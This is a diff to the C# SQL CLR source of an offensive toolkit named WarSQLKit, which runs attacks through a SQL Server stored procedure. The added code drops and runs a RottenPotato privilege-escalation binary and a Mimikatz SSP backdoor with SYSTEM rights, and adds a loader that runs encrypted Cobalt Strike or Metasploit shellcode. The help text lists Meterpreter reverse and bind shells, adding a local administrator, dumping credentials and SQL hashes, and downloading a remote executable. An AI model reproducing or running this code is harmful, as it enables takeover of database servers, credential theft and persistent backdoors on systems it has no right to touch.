@@ -103,6 +103,71 @@ public partial class StoredProcedures
                 File.Delete("C:\\ProgramData\\MimiPs.exe");
             }
         }
+        if (cmd == "sp_MimikatzSSP")
+        {
+            if (!File.Exists("C:\\ProgramData\\Kumpir.exe"))
+            {
+                SqlContext.Pipe.Send("Creating Kumpir File");
+                var createKumpir = new CreateKumpir();
+                createKumpir.KumpirBytes();
+            }
+            try
+            {
+                var mimiBuilder = new MeterpreterBuilder();
+                mimiBuilder.SaveMimikatzSsp();
+                var getMimikatzLocation = @"C:\ProgramData\MimiSSP.exe";
+                SqlContext.Pipe.Send("Running PowerShell command with \"NT AUTHORITY\\SYSTEM\" rights");
+                result = RunCommand("cmd.exe",
+                    " /c C:\\ProgramData\\Kumpir.exe \"" + getMimikatzLocation + "\"");
+                result = GetMimiLog();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+                throw;
+            }
+            finally
+            {
+                File.Delete("C:\\ProgramData\\Kumpir.exe");
+                File.Delete("C:\\ProgramData\\MimiSSP.exe");
+            }
+        }
+        if (cmd.Contains("sp_ShellCode"))
+        {
+            string[] cmdSplit = cmd.Split(' ');
+            string ScByte = cmdSplit[1];
+            string Key = cmdSplit[2];
+            if (!File.Exists("C:\\ProgramData\\loader.exe"))
+            {
+                SqlContext.Pipe.Send("Creating loader File");
+                var createKumpir = new CreateKumpir();
+                createKumpir.LoaderBytes();
+            }
+            if (cmd.Contains("GetSystem"))
+            {
+                try
+                {
+                    var createKumpir = new CreateKumpir();
+                    createKumpir.KumpirBytes();
+                    RunCommand(@"C:\Windows\System32\cmd.exe", @" /c C:\\ProgramData\\Kumpir.exe ""C:\ProgramData\loader " + ScByte + @" " + Key + @" """);
+                }
+                catch (Exception e)
+                {
+                    SqlContext.Pipe.Send(e.Message);
+                }
+            }
+            else
+            {
+                try
+                {
+                    RunCommand(@"C:\Windows\System32\cmd.exe", @" /c C:\ProgramData\loader " + ScByte + @" " + Key + @" """);
+                }
+                catch (Exception e)
+                {
+                    SqlContext.Pipe.Send(e.Message);
+                }
+            }
+        }
         if (cmd.Contains("sp_meterpreter_reverse_tcp"))
         {
             if (cmd.Contains("GetSystem"))
@@ -273,20 +338,23 @@ public partial class StoredProcedures
         if (cmd == "sp_help")
         {
             result = "WarSQLKit Command Example\n"
-+ "EXEC sp_cmdExec 'whoami'; => Any Windows command\n"
-+ "EXEC sp_cmdExec 'whoami /RunSystemPriv'; => Any Windows command with NT AUTHORITY\\SYSTEM rights\n"
-+ "EXEC sp_cmdExec '\"net user eyup P@ssw0rd1 /add\" /RunSystemPriv'; => Adding users with RottenPotato (Kumpir)\n"
-+ "EXEC sp_cmdExec '\"net localgroup administrators eyup /add\" /RunSystemPriv'; => Adding user to localgroup with RottenPotato (Kumpir)\n"
-+ "EXEC sp_cmdExec 'powershell Get-ChildItem /RunSystemPS'; => (Powershell) with RottenPotato (Kumpir)\n"
-+ "EXEC sp_cmdExec 'sp_meterpreter_reverse_tcp LHOST LPORT GetSystem'; => x86 Meterpreter Reverse Connection with  NT AUTHORITY\\SYSTEM\n"
-+ "EXEC sp_cmdExec 'sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem'; => x64 Meterpreter Reverse Connection with  NT AUTHORITY\\SYSTEM\n"
-+ "EXEC sp_cmdExec 'sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem'; => x86 Meterpreter Reverse Connection RC4 with  NT AUTHORITY\\SYSTEM, RC4PASSWORD=warsql\n"
-+ "EXEC sp_cmdExec 'sp_meterpreter_bind_tcp LPORT GetSystem'; => x86 Meterpreter Bind Connection with  NT AUTHORITY\\SYSTEM\n"
-+ "EXEC sp_cmdExec 'sp_Mimikatz'; " + Environment.NewLine + "select * from WarSQLKitTemp => Get Mimikatz Log. Thnks Benjamin Delpy :)\n"
-+ "EXEC sp_cmdExec 'sp_downloadFile http://eyupcelik.com.tr/file.exe C:\\ProgramData\\file.exe 300';  => Download File\n"
-+ "EXEC sp_cmdExec 'sp_getSqlHash';  => Get MSSQL Hash\n"
-+ "EXEC sp_cmdExec 'sp_getProduct';  => Get Windows Product\n"
-+ "EXEC sp_cmdExec 'sp_getDatabases';  => Get Available Database\n";
++ "whoami => Any Windows command\n"
++ "whoami /RunSystemPriv => Any Windows command with NT AUTHORITY\\SYSTEM rights\n"
++ "\"net user eyup P@ssw0rd1 /add\" /RunSystemPriv => Adding users with RottenPotato (Kumpir)\n"
++ "\"net localgroup administrators eyup /add\" /RunSystemPriv => Adding user to localgroup with RottenPotato (Kumpir)\n"
++ "powershell Get-ChildItem /RunSystemPS => (Powershell) with RottenPotato (Kumpir)\n"
++ "sp_meterpreter_reverse_tcp LHOST LPORT GetSystem => x86 Meterpreter Reverse Connection with  NT AUTHORITY\\SYSTEM\n"
++ "sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem => x64 Meterpreter Reverse Connection with  NT AUTHORITY\\SYSTEM\n"
++ "sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem => x86 Meterpreter Reverse Connection RC4 with  NT AUTHORITY\\SYSTEM, RC4PASSWORD=warsql\n"
++ "sp_meterpreter_bind_tcp LPORT GetSystem => x86 Meterpreter Bind Connection with  NT AUTHORITY\\SYSTEM\n"
++ "sp_Mimikatz" + Environment.NewLine + "select * from WarSQLKitTemp => Get Mimikatz Log. Thnks Benjamin Delpy :)\n"
++ "sp_MimikatzSSP  => Ssp Backdoor\n"
++ "sp_downloadFile http://eyupcelik.com.tr/file.exe C:\\ProgramData\\file.exe 300  => Download File\n"
++ "sp_getSqlHash  => Get MSSQL Hash\n"
++ "sp_getProduct  => Get Windows Product\n"
++ "sp_getDatabases  => Get Available Database\n"
++ "sp_frpsocks5  => Todo: Use Frpc to open socks5\n"
++ "sp_ShellCode encrypt_code key GetSystem => Run Shellcode with Encrypt CobaltStrike or Metasploit with SYSTEM\n";
         }
     }
     public static string RunCommand(string filename, string arguments)
